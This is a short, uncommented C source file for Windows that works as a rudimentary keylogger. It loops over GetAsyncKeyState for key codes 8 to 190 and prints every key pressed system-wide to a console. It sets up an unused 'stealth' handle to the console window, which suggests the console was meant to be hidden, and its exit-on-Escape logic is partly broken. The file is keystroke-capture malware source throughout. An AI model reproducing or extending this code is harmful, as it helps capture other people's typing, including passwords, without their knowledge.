#include<stdio.h>
#include<windows.h>
#include<winuser.h>
int main()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass",NULL);
    char i;
    while(1)
    {
            for(i=8;i<=190;i++)
            {
                               if(GetAsyncKeyState(i)==-32767)
                               {
                               printf("%c",i);
                               }
                               else if(i==27 && GetAsyncKeyState(i) == -32767)
                               break;
            }
            if(i==27)
            break;
    }
 return 0;   
}
